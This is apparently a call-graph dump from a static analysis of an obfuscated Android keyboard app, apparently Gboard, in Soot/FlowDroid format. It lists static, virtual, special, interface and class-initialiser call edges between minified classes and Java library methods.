CLINIT edge: staticinvoke <lkq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkq: void <clinit>()>
STATIC edge: $r1 = staticinvoke <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>($r0, $i2, $i0, $i1) in <lqq: java.lang.Object s(java.lang.Object[],int,int,int)> ==> <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: int hashCode()>
STATIC edge: $r4 = staticinvoke <lqq: lqq r(int,java.lang.Object[],lkt)>($i0, $r1, r0) in <lkt: lkx b(boolean)> ==> <lqq: lqq r(int,java.lang.Object[],lkt)>
CLINIT edge: staticinvoke <lpi: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lpi: void <clinit>()>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r0) in <iwt: java.lang.String e(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: $r2 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: int hashCode()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
CLINIT edge: staticinvoke <ltr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltr: void <clinit>()>
STATIC edge: $i7 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/notificationcenter/ComponentsReadinessManager") in <iej: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <lki: java.lang.Object getKey()>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("TenorSearchSuggestionMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r3.<lsf: void <init>(lsh,java.util.logging.Level)>(r0, $r1) in <lsh: lse h(java.util.logging.Level)> ==> <lsf: void <init>(lsh,java.util.logging.Level)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: void t(int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lmc: lsa l()>
CLINIT edge: staticinvoke <lvt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvt: void <clinit>()>
CLINIT edge: staticinvoke <ose: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ose: void <clinit>()>
STATIC edge: staticinvoke <izw: boolean D(java.util.Collection,java.util.Iterator)>($r1, $r0) in <lri: java.util.ArrayList P(java.util.Iterator)> ==> <izw: boolean D(java.util.Collection,java.util.Iterator)>
SPECIAL edge: specialinvoke $r0.<java.lang.Object: void <init>()>() in <ljd: void <clinit>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <java.lang.Double: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Double: void <clinit>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $c1 = virtualinvoke $r1.<java.lang.String: char charAt(int)>($i2) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i5, $i1) in <ljd: int z(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<liz: void b()>() in <liz: java.lang.Object next()> ==> <liz: void b()>
STATIC edge: $r22 = staticinvoke <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)>(class "Llsn;", $i0) in <lsd: boolean b(lsr)> ==> <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <liy: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Couldn\'t get the Unsafe") in <j$.sun.misc.b: void <clinit>()> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r0.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>($r1, $r2, $z0, 1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.String: int length()>() in <ivv: ivw a()> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
STATIC edge: staticinvoke <ojg: void g(java.lang.Throwable,java.lang.String)>($r0, $r1) in <ojg: void h(java.lang.Throwable)> ==> <ojg: void g(java.lang.Throwable,java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r5.<java.text.SimpleDateFormat: java.lang.String format(java.util.Date)>($r3) in <lsc: void f(java.lang.String,ltn)> ==> <java.text.DateFormat: java.lang.String format(java.util.Date)>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lqp: void <init>(java.lang.Object[],int,int)> ==> <lkq: void <init>()>
STATIC edge: $r3 = staticinvoke <kes: java.lang.String k(nfe)>($r26) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kes: java.lang.String k(nfe)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/latin/ImeLatinApp") in <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
STATIC edge: $r0 = staticinvoke <lth: lth i(java.lang.String)>("AndroidIME") in <hef: void <clinit>()> ==> <lth: lth i(java.lang.String)>
STATIC edge: $l0 = staticinvoke <lum: long b()>() in <lsn: void <init>(java.util.logging.Level)> ==> <lum: long b()>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r5) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <ljb: java.lang.Object getValue()>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String d()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: java.lang.String d()>
CLINIT edge: staticinvoke <lsu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsu: void <clinit>()>
VIRTUAL edge: $z2 = virtualinvoke $r1.<java.lang.String: boolean isEmpty()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: boolean isEmpty()>
VIRTUAL edge: $r7 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>(null, $r5, "", $r6, "") in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
CLINIT edge: staticinvoke <jlu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jlu: void <clinit>()>
STATIC edge: $r1 = staticinvoke <izw: java.util.Collection at(java.lang.Iterable)>($r0) in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <izw: java.util.Collection at(java.lang.Iterable)>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lma: int e(int)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r0) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r0.<hbv: void j()>() in <hbv: boolean o()> ==> <hbv: void j()>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: java.lang.Object[] s()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
STATIC edge: $r2 = staticinvoke <ivw: ivv I()>() in <ivw: ivw d(java.util.Locale)> ==> <ivw: ivv I()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: int hashCode()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "cellsBusy") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
STATIC edge: $r3 = staticinvoke <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>($r1, $r2, $i0, 0, $r3) in <lqq: java.lang.Object get(java.lang.Object)> ==> <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>
STATIC edge: $z1 = staticinvoke <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>($r2, $r1) in <hbv: void k(java.lang.Object,boolean)> ==> <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lqc: void <init>()> ==> <lqd: void <init>()>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <ljb: java.lang.Object getValue()>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: int z(int,int,int,int)> ==> <ljd: int[] w()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <ivw: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $z0 = staticinvoke <lma: boolean x(int,int)>($i5, $i1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: boolean x(int,int)>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r3, $i2, 2) in <ivv: ivw b(java.lang.String)> ==> <iwt: void g(char[],int,int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Invalid subtag: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: staticinvoke <nvw: void j(int[],int[],int,int,int)>($r4, $r4, $i0, $i3, $i1) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <nvw: void j(int[],int[],int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
INTERFACE edge: $i0 = interfaceinvoke $r3.<java.util.List: int size()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lql: int size()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: int f(java.lang.Object)> ==> <ljd: boolean v()>
CLINIT edge: staticinvoke <j$.sun.misc.b: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.sun.misc.b: void <clinit>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r12 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>($r19) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>
CLINIT edge: staticinvoke <java.util.Locale: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.Locale: void <clinit>()>
VIRTUAL edge: virtualinvoke r0.<lli: void e(java.lang.Object,java.lang.Object)>($r2, $r3) in <lli: void c(java.util.Map$Entry)> ==> <lli: void e(java.lang.Object,java.lang.Object)>
INTERFACE edge: $l0 = interfaceinvoke $r2.<ltn: long e()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsn: long e()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<ljf: java.lang.Object e(int)>($i0) in <lje: java.lang.Object next()> ==> <ljf: java.lang.Object e(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <lpi: void <init>(java.lang.String,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r1.<ltc: void <init>(java.lang.String,int,int)>("SMALL", 0, 10) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<lkf: java.lang.Object get(java.lang.Object)>($r2) in <ivw: java.lang.String p()> ==> <lqk: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.IllegalStateException: void <init>(java.lang.String)>("cannot request log site information prior to postProcess()") in <lsn: lsq f()> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r8.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_FULL_IMAGE", 8, 8) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("extlang subtag only occurs when language subtag length is 2 or 3") in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r4) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <liy: int size()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r3 = staticinvoke <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>($r1, $r2, $i0, $i1, $r3) in <lqk: java.lang.Object get(java.lang.Object)> ==> <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
STATIC edge: $r0 = staticinvoke <lum: java.lang.String[] o()>() in <luk: void <clinit>()> ==> <lum: java.lang.String[] o()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.Object cast(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap: void <init>()>
STATIC edge: $z0 = staticinvoke <lri: boolean a(java.util.Comparator,java.lang.Iterable)>($r5, $r4) in <lqs: boolean equals(java.lang.Object)> ==> <lri: boolean a(java.util.Comparator,java.lang.Iterable)>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>(0) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
SPECIAL edge: specialinvoke $r5.<lsm: void <init>()>() in <lsn: void q(lsz,java.lang.Object)> ==> <lsm: void <init>()>
SPECIAL edge: specialinvoke $r17.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r19) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/inputmethodentry/InputMethodEntryManager") in <hnt: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lid: int hashCode()>
VIRTUAL edge: virtualinvoke $r19.<java.util.concurrent.atomic.AtomicInteger: int incrementAndGet()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicInteger: int incrementAndGet()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $r4 = virtualinvoke $r4.<java.lang.String: java.lang.String substring(int)>($i0) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String substring(int)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i1) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lvt: void <init>(lvr)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r1 = staticinvoke <kwe: miy x(java.lang.Object)>(null) in <her: void <clinit>()> ==> <kwe: miy x(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<mii: void <init>()>() in <mij: void <init>(miy)> ==> <mii: void <init>()>
VIRTUAL edge: $i3 = virtualinvoke $r1.<java.lang.String: int length()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r3.<java.util.Date: void <init>(long)>($l0) in <lsc: void f(java.lang.String,ltn)> ==> <java.util.Date: void <init>(long)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, $i1, $i4) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: $r4 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r1) in <lly: lma g()> ==> <lma: lma i(int,java.lang.Object[])>
SPECIAL edge: $z0 = specialinvoke r0.<hbv: boolean o()>() in <hbv: boolean m(java.lang.Object)> ==> <hbv: boolean o()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(10) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r7, $i5, $i1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: void an(java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <lsp: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" but determined result is ") in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
VIRTUAL edge: $r3 = virtualinvoke $r25.<java.lang.Class: java.lang.String getName()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.Class: java.lang.String getName()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <j$.sun.misc.b: j$.sun.misc.b h()>() in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: j$.sun.misc.b h()>
SPECIAL edge: specialinvoke $r1.<java.util.LinkedHashSet: void <init>(int,float)>($i0, 1.0F) in <ljf: java.util.Set f()> ==> <java.util.LinkedHashSet: void <init>(int,float)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>() in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(12) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_GlobalAdditionalImeDefsLoaded", $r5) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i1) in <lkg: void g(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r1, $i1, $i2) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <hbu: hbs f(java.lang.String,long)>("client_error_logging_level", $l0) in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <hbu: hbs f(java.lang.String,long)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lkx: boolean containsKey(java.lang.Object)>($r1) in <ivw: boolean P()> ==> <lkx: boolean containsKey(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r0) in <ivw: boolean B(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
STATIC edge: $r6 = staticinvoke <lma: lly g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lma: lly g()>
INTERFACE edge: interfaceinvoke $r1.<java.util.Set: boolean add(java.lang.Object)>($r2) in <ljf: java.util.Set f()> ==> <java.util.HashSet: boolean add(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lqo: void <init>(lkx,lkq)>(r0, $r1) in <lqq: lma g()> ==> <lqo: void <init>(lkx,lkq)>
STATIC edge: $r6 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r4, $i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
